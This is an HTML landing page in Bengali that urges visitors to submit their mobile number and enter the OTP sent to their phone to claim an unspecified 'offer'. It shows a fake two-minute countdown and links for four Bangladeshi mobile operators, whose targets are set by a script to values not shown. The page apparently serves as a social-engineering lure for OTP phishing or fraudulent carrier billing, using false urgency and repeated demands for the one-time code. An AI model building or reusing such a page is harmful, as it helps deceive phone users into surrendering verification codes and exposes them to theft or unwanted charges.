<body class="bg-white" style="background: url(&quot;assets/img/bg.png&quot;) center / auto repeat;">
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-6 mt-5">
                <div class="rounded-3 text-center" style="background: #eddfdf;border: 10px solid rgb(211,0,0) ;">
                    <div
                        style="height: 200px; width: auto; background: url(assets/img/header.png) center / cover no-repeat;">
                    </div>
                    <p class="text-center fw-bold m-2">অফার টি পেতে অবশ্যই আপনার মোবাইল নম্বর সাবমিট করে মোবাইলে যে পিন
                        কোড যাবে সেটি দিয়ে OTP ভেরিফিকেশন করুন।</p>
                    <hr>
                    <div class="timer container mt-4">
                        <div class="alert " role="alert">
                    <div id="countdown">
                        <strong>মাত্র <span id="minutes" class="text-danger">02</span> মিনিট <span
                                class="text-danger" id="seconds">00</span> সেকেন্ড সময় বাকি আছে </strong>
                    </div>
                </div>
                    </div>
                    <h1 class="fw-bold text-center text-danger fs-2 m-2">নিচে থেকে অফার সিলেক্ট করুন</h1>
                    <div class="pb-2 text-center"><a class="m-2 rounded-4 text-center gplink" href="#"><img class="imgs"
                                src="assets/img/gp.png" width="auto" height="150"></a><a
                            class="m-2 rounded-4 text-center bllink" href="#"><img class="imgs" src="assets/img/bl.png"
                                width="auto" height="150"></a><a class="m-2 rounded-4 text-center rblink" href="#"><img
                                class="imgs" src="assets/img/rb.png" width="auto" height="150"></a><a
                            class="m-2 rounded-4 text-center arlink" href="#"><img class="imgs" src="assets/img/ar.png"
                                width="auto" height="150"></a></div>
                    <p class="text-center text-decoration-underline fs-4 rounded-4 m-3 p-1">OTP না দিলে কোনো অফার আসবে
                        না। মনে রাখবেন OTP দিয়ে আপনার অফার দেয়া হয়।</p>
                </div>
            </div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        function changeHref(className, newHref) {
          var elements = document.getElementsByClassName(className);
    
          for (var i = 0; i < elements.length; i++) {
            elements[i].href = newHref;
          }
        }
        changeHref('gplink', gplink);
        changeHref('bllink', bllink);
        changeHref('arlink', arlink);
        changeHref('rblink', rblink);
      </script>
    <script>
        (function () {
            const second = 1000,
                minute = second * 60;

            const countDown = new Date().getTime() + 2 * minute, 
                x = setInterval(function () {

                    const now = new Date().getTime(),
                        distance = countDown - now;

                    document.getElementById("minutes").innerText = String(Math.floor(distance / (minute))).padStart(2, "0");
                    document.getElementById("seconds").innerText = String(Math.floor((distance % (minute)) / second)).padStart(2, "0");

                    if (distance < 0) {
                        document.getElementById("countdown").innerHTML = "<strong>Time's up!</strong>";
                        clearInterval(x);
                    }
                }, 1000);
        }());
    </script>
</body>
